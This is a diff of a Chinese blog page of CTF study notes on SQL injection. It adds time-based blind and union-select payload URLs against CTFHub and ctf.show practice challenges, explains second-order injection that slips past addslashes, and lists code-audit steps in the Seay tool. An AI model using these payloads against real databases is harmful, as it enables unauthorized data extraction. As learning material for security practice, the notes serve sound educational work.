@@ -481,14 +481,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    3.2k
+                    4.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    14 分
+                    17 分
                 </div>
                 
 
@@ -788,6 +788,58 @@ left((select database()),1)&#x3D;‘s’ 同样的意思
 <li>逐个字符判断数据库中表的名字，(此处ascii(f) = 102)<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &#x3D; 102,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <img src="https://s2.loli.net/2022/07/02/fOi4p3JN1MxbqGH.png"></li>
 <li>猜测flag表的字段数<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(column_name) from information_schema.columns where table_name &#x3D; &#39;flag&#39;) &#x3D; 1,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h2 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><h3 id="例题：sqli-labs38"><a href="#例题：sqli-labs38" class="headerlink" title="例题：sqli-labs38"></a>例题：sqli-labs38</h3><ol>
+<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,database() –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712135428.png"></li>
+<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1) –+      得到一共四个表<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712135922.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140048.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140103.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140115.png"></li>
+<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select column_name from information_schema.columns where table_name =’users’ limit 0,1) –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140251.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140309.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140324.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140334.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140348.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140402.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140415.png"></li>
+<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select group_concat(id) from security.users limit 0,1) –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140627.png"></li>
+</ol>
+<h4 id="注意是information-schema"><a href="#注意是information-schema" class="headerlink" title="注意是information_schema"></a>注意是information_schema</h4><ol>
+<li>是下划线不是点，命名时数字字母下划线，没有点！！！</li>
+<li>点表示选择，而information_schema是一个表</li>
+</ol>
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
+<li>必须含有<strong>insert</strong>和<strong>update</strong>函数</li>
+<li>变量可控<h3 id="原理：-绕过转义注入-魔术引号"><a href="#原理：-绕过转义注入-魔术引号" class="headerlink" title="原理： 绕过转义注入 魔术引号"></a>原理： <strong>绕过转义</strong>注入 魔术引号</h3></li>
+<li>已经存储（数据库，文件）的用户输入被读取后再次进入到SQL查询语句中导致的注入</li>
+<li>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是<strong>虽然参数在过滤后会添加 “\” 进行转义</strong>，但是<strong>“\”并不会插入到数据库中</strong>，在写入数据库的时候还是<strong>保留了原来的数据</strong>。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中<strong>取出了脏数据</strong>，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</li>
+</ol>
+<h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><ol>
+<li>注册用户（插入数据）：    insert xiaodi union select’</li>
+<li>过滤：        xiaodi union select&#39;</li>
+<li>进入数据库：  xiaodi union select’</li>
+<li>修改用户（修改数据库中的数据）：    update xiaodi union select’ 条件=用户名是谁  xiaodi’ union select update注入</li>
+</ol>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
+<li>插入恶意数据：进行数据库插入数据时，对其中的特殊字符进行了转义处理（<strong>转义只是为了校验</strong>），在写入数据库时又<strong>还原</strong>了原来的数据</li>
+<li>应用恶意数据：开发者默认存入数据库中的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行下一步的校验处理</li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712142916.png"></li>
+</ol>
+<h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ol>
+<li>注册用户：insert xiaodi’</li>
+<li>修改用户：update</li>
+</ol>
+<h3 id="二次注入功能点"><a href="#二次注入功能点" class="headerlink" title="二次注入功能点"></a>二次注入功能点</h3><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><h3 id="过滤函数addslashes"><a href="#过滤函数addslashes" class="headerlink" title="过滤函数addslashes"></a>过滤函数addslashes</h3><ol>
+<li>addslashes()函数在指定的预定义字符前添加反斜杠，这些字符是：单引号（’）、双引号（”）、反斜线（\）与NUL（NULL字符）。</li>
+<li>定义：string addslashes ( string $str )</li>
+</ol>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="seay"><a href="#seay" class="headerlink" title="seay"></a>seay</h3><ol>
+<li>关键字搜索，使用全局搜索,搜索可控变量或者执行函数</li>
+<li>搜索例如select update insert 等sql语句函数，看看是否有可控变量，没有可控变量就是死sql语句，无法进行sql注入</li>
+<li>函数查询</li>
+<li>找到具体函数之后，右键定位函数使用的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li>
+</ol>
+<h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><ol>
+<li>搜索select</li>
+<li>找到变量</li>
+<li>找到变量调用函数</li>
+<li>右键定位函数调用位置</li>
+<li>看看页面和数据库的互动，根据回显判断注入点</li>
+</ol>
+<h4 id="判断过滤机制"><a href="#判断过滤机制" class="headerlink" title="判断过滤机制"></a>判断过滤机制</h4><ol>
+<li>看配置文件，看配置文件的关键字，例如：fun、inc</li>
 </ol>
 
                 
@@ -1343,7 +1395,7 @@ left((select database()),1)&#x3D;‘s’ 同样的意思
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">55.3k</span>&nbsp;字
+                class="white-color">59.5k</span>&nbsp;字
             
             
             
